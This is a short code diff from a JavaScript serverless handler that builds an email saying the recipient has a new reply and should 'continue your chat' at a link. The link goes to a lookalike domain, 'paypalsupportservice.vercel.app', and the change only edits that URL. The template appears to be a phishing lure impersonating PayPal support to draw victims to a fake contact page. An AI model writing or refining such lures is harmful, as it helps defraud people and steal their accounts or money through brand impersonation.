@@ -23,7 +23,7 @@ export default async function handler(req, res) {
 You have a new reply to your recent conversation.
 
 Please view the message and continue your chat here:
-https://paypalsupportservice.vercel.app/contact.html
+https://paypalsupportservice.vercel.app/contact
 
 Thank you,
 The Service Team`;
